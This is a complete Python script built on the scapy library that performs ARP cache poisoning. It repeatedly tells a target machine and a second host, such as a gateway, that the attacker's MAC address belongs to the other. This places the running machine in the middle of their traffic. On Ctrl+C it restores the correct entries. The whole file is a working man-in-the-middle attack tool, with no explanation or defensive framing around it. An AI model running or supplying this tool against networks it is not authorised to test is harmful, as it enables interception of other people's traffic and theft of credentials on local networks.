from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys

def get_mac(ip):
    ans, _ = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(pdst = ip), timeout = 3, verbose = 0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose = True):
    target_mac = get_mac(target_ip)
    
    arp_reply = ARP(pdst = target_ip, hwdst = target_mac, psrc = host_ip, op = 'is-at')
    send(arp_reply, verbose = 0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose = True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_reply = ARP(pdst = target_ip, hwdst = target_mac, psrc = host_ip, hwsrc = host_mac)
    send(arp_reply, verbose = 0, count = 7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

def main():
    target = sys.argv[1]
    host = sys.argv[2]
    verbose = True
    try:
        while True:
            spoof(target, host, verbose)
            spoof(host, target, verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring the network, please wait...")
        restore(target, host)
        restore(host, target)

if __name__ == "__main__":
    main()